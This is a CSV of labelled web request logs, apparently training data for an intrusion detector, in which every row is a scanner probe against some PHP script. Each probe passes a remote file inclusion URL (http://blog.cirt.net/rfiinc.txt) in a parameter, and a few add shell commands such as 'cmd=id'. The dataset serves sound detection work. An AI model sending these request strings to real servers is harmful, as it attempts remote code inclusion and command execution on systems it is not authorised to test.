timestamp,ip,method,url,status,payloadSize,payloadSnippet,userAgent,responseTimeMs,time_delta,auth_fail,rapid_request,large_payload,is_get,xss_pattern,sqli_pattern,fail_rolling,label
2026-01-01 08:09:42.887000+00:00,::ffff:127.0.0.1,GET,/awzmb/modules/reg.incl.php?Setting[OPT_includepath]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.888000+00:00,::ffff:127.0.0.1,GET,/axoverzicht.cgi?maand=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.888000+00:00,::ffff:127.0.0.1,GET,/b2-tools/gm-2-b2.php?b2inc=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.889000+00:00,::ffff:127.0.0.1,GET,/b2verifauth.php?index=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.890000+00:00,::ffff:127.0.0.1,GET,/backend/addons/links/index.php?PATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.890000+00:00,::ffff:127.0.0.1,GET,/basebuilder/src/main.inc.php?mj_config[src_path]=http://blog.cirt.net/rfiinc.txt???,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.893000+00:00,::ffff:127.0.0.1,GET,/bb_admin.php?includeFooter=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.003,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.894000+00:00,::ffff:127.0.0.1,GET,/beacon/language/1/splash.lang.php?languagePath=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.895000+00:00,::ffff:127.0.0.1,GET,/beacon/language/1/splash.lang.php?languagePath=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.896000+00:00,::ffff:127.0.0.1,GET,/belegungsplan/jahresuebersicht.inc.php?root=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.897000+00:00,::ffff:127.0.0.1,GET,/belegungsplan/monatsuebersicht.inc.php?root=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.898000+00:00,::ffff:127.0.0.1,GET,/belegungsplan/tagesuebersicht.inc.php?root=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.899000+00:00,::ffff:127.0.0.1,GET,/belegungsplan/wochenuebersicht.inc.php?root=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.900000+00:00,::ffff:127.0.0.1,GET,/biblioteca/bib_form.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.900000+00:00,::ffff:127.0.0.1,GET,/bemarket/postscript/postscript.php?p_mode=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.901000+00:00,::ffff:127.0.0.1,GET,/biblioteca/bib_pldetails.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.903000+00:00,::ffff:127.0.0.1,GET,/biblioteca/bib_plform.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.904000+00:00,::ffff:127.0.0.1,GET,/biblioteca/bib_plsearchc.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.905000+00:00,::ffff:127.0.0.1,GET,/biblioteca/bib_plsearchs.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.906000+00:00,::ffff:127.0.0.1,GET,/biblioteca/bib_save.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.906000+00:00,::ffff:127.0.0.1,GET,/biblioteca/bib_searchc.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.907000+00:00,::ffff:127.0.0.1,GET,/biblioteca/bib_searchs.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.908000+00:00,::ffff:127.0.0.1,GET,/biblioteca/edi_form.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.909000+00:00,::ffff:127.0.0.1,GET,/biblioteca/edi_save.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.910000+00:00,::ffff:127.0.0.1,GET,/biblioteca/gen_form.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.911000+00:00,::ffff:127.0.0.1,GET,/biblioteca/gen_save.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.913000+00:00,::ffff:127.0.0.1,GET,/biblioteca/lin_form.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.914000+00:00,::ffff:127.0.0.1,GET,/biblioteca/lin_save.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.915000+00:00,::ffff:127.0.0.1,GET,/biblioteca/luo_form.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.916000+00:00,::ffff:127.0.0.1,GET,/biblioteca/luo_save.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.917000+00:00,::ffff:127.0.0.1,GET,/biblioteca/sog_form.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.918000+00:00,::ffff:127.0.0.1,GET,/biblioteca/sog_save.php?CLASSPATH=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.919000+00:00,::ffff:127.0.0.1,GET,/bigace/addon/smarty/plugins/function.captcha.php?GLOBALS[_BIGACE][DIR][addon]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.920000+00:00,::ffff:127.0.0.1,GET,/bigace/system/admin/plugins/menu/menuTree/plugin.php?GLOBALS[_BIGACE][DIR][admin]=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.920000+00:00,::ffff:127.0.0.1,GET,/bigace/system/application/util/item_information.php?GLOBALS[_BIGACE][DIR][admin]=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.921000+00:00,::ffff:127.0.0.1,GET,/bigace/system/application/util/jstree.php?GLOBALS[_BIGACE][DIR][admin]=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.924000+00:00,::ffff:127.0.0.1,GET,/bigace/system/classes/sql/AdoDBConnection.php?GLOBALS[_BIGACE][DIR][addon]=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.003,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.925000+00:00,::ffff:127.0.0.1,GET,/bild.php?config[root_ordner]=http://blog.cirt.net/rfiinc.txt?&cmd=id,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.926000+00:00,::ffff:127.0.0.1,GET,/bin/qte_init.php?qte_root=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.927000+00:00,::ffff:127.0.0.1,GET,/bingoserver.php3?response_dir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.928000+00:00,::ffff:127.0.0.1,GET,/block.php?Include=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.929000+00:00,::ffff:127.0.0.1,GET,/blocks/birthday.php?full_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.930000+00:00,::ffff:127.0.0.1,GET,/blocks/events.php?full_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.931000+00:00,::ffff:127.0.0.1,GET,/blocks/help.php?full_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.932000+00:00,::ffff:127.0.0.1,GET,/blogcms/admin/media.php?DIR_LIBS=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.933000+00:00,::ffff:127.0.0.1,GET,/blogcms/admin/xmlrpc/server.php?DIR_LIBS=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.936000+00:00,::ffff:127.0.0.1,GET,/blogcms/index.php?DIR_PLUGINS=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.003,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.937000+00:00,::ffff:127.0.0.1,GET,/board/post.php?qb_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.938000+00:00,::ffff:127.0.0.1,GET,/boitenews4/index.php?url_index=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.939000+00:00,::ffff:127.0.0.1,GET,/books/allbooks.php?home=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.940000+00:00,::ffff:127.0.0.1,GET,/books/home.php?home=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.941000+00:00,::ffff:127.0.0.1,GET,/books/mybooks.php?home=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.941000+00:00,::ffff:127.0.0.1,GET,/bp_ncom.php?bnrep=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.942000+00:00,::ffff:127.0.0.1,GET,/bp_ncom.php?bnrep=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.943000+00:00,::ffff:127.0.0.1,GET,/bp_news.php?bnrep=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.944000+00:00,::ffff:127.0.0.1,GET,/bridge/enigma/E2_header.inc.php?boarddir=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.946000+00:00,::ffff:127.0.0.1,GET,/bridge/yabbse.inc.php?sourcedir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.947000+00:00,::ffff:127.0.0.1,GET,/bridges/SMF/logout.php?path_to_smf=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.948000+00:00,::ffff:127.0.0.1,GET,/bu/bu_cache.php?bu_dir=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.949000+00:00,::ffff:127.0.0.1,GET,/bu/bu_claro.php?bu_dir=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.950000+00:00,::ffff:127.0.0.1,GET,/bu/bu_parse.php?bu_dir=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.951000+00:00,::ffff:127.0.0.1,GET,/bu/process.php?bu_dir=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.952000+00:00,::ffff:127.0.0.1,GET,/buddy.php?CONFIG[MWCHAT_Libs]=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.952000+00:00,::ffff:127.0.0.1,GET,/builddb.php?env_dir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.953000+00:00,::ffff:127.0.0.1,GET,/button/settings_sql.php?path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.954000+00:00,::ffff:127.0.0.1,GET,/cadre/fw/class.Quick_Config_Browser.php?GLOBALS[config][framework_path]=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.956000+00:00,::ffff:127.0.0.1,GET,/cal.func.php?dir_edge_lang=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.957000+00:00,::ffff:127.0.0.1,GET,/calcul-page.php?home=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.958000+00:00,::ffff:127.0.0.1,GET,/calendar.php?cfg_dir=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.959000+00:00,::ffff:127.0.0.1,GET,/calendar.php?lang=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.960000+00:00,::ffff:127.0.0.1,GET,/calendar.php?path_to_calendar=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.961000+00:00,::ffff:127.0.0.1,GET,/calendar.php?vwar_root=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.962000+00:00,::ffff:127.0.0.1,GET,/calendar.php?vwar_root=http://blog.cirt.net/rfiinc.txt?&cmd=ls,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.963000+00:00,::ffff:127.0.0.1,GET,/calendar/demo/index.php?date=&v=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.964000+00:00,::ffff:127.0.0.1,GET,/calendar/payment.php?insPath=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
